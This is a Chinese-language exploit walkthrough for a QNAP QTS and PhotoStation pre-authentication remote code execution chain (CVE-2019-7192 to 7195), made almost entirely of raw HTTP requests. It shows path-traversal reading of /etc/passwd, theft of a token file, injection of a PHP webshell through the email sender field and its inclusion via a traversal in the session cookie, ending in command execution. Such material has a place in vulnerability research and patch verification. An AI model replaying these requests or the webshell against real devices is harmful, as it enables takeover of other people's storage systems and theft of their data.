# QNAP QTS and PhotoStation RCE

* CVE-2019-7192（CVSS 9.8）
* CVE-2019-7193（CVSS 9.8）
* CVE-2019-7194（CVSS 9.8）
* CVE-2019-7195（CVSS 9.8）

https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05
## 任意文件读取

### 获取album ID

```
POST /photo/p/api/album.php HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

a=setSlideshow&f=qsamplealbum
```

```
HTTP/1.1 200 OK
Date: Wed, 20 May 2020 02:17:47 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
Set-Cookie: QMS_SID=6f1cee1fb13b47953586ff393dbe860d; path=/;HttpOnly
Upgrade: h2
Connection: Upgrade, close
Content-Type: text/xml;charset=utf-8
Content-Length: 141

<?xml version="1.0"?>
<QDocRoot version="1.0"><status>0</status><output>cJinsP</output><timestamp>2020-05-20 10:17:47</timestamp></QDocRoot>
```

### 获取$_SESSION['access_code']

```
GET /photo/slideshow.php?album=cJinsP HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

```
PS.nasInfo = {
		sid:'',
		albumCode: 'cJinsP',
		code: encodeURIComponent('MHwxfDE1ODk5NDEzMjI='),
```

### 读取任意文件

```
POST /photo/p/api/video.php HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: QMS_SID=1999d3e64d79a7e91380f660df00a238;PHPSESSID=3bbc50b4338c0a848e4425cd08b3662b
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

album=cJinsP&a=caption&ac=MHwxfDE1ODk5NDQwNjA=&f=UMGObv&filename=../../../../etc/passwd
```



## 任意代码写入

### 读取token文件或爆破shadow

```
$ cat /share/Multimedia/.@__thumb/ps.app.token
eaee23cf0c2640ecbe2f43f11cf42871
```

### 登录后台电子邮件设置处写入

```
POST /cgi-bin/userConfig.cgi?sid=944xytnw HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 173
Connection: close
Cookie: DESKTOP=1; WINDOW_MODE=1; nas_wfm_tree_x=200; QSYNC_USER=kanjie; treeRootPathkanjie=/homes; desktop-page=2; QMS_SID=2060fd20166137a695959837adb4e6b2; PHPSESSID=2060fd20166137a695959837adb4e6b2; QT=1589967777265; NAS_USER=kanjie; NAS_SID=944xytnw; home=1

func=addPersonalSmtp&provider_idx=0&sender=<?=`$_POST[o]`?>@evil.com&default=0&smtp_server=0.0.0.0&port=25&security=-1&email_account=123123%4013131.com&email_passwd=1q2w3e4r
```

## 任意命令执行

### 使用上一步写入的cookie

```
GET /photo/slideshow.php?album=qsamplealbum HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: QMS_SID=XXXXX/../../../../../../../../../../mnt/ext/opt/photostation2/o.php;DESKTOP=1; WINDOW_MODE=1; nas_wfm_tree_x=200; QSYNC_USER=kanjie; treeRootPathkanjie=/homes; desktop-page=2; QMS_SID=2060fd20166137a695959837adb4e6b2; PHPSESSID=2060fd20166137a695959837adb4e6b2; QT=1589967777265; NAS_USER=kanjie; NAS_SID=944xytnw; home=1
```

### 执行命令

```
POST /photo/o.php HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: QMS_SID=2060fd20166137a695959837adb4e6b2; PHPSESSID=2060fd20166137a695959837adb4e6b2; QT=1589968238647; NAS_USER=kanjie; NAS_SID=944xytnw; home=1
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 4

o=ls
```
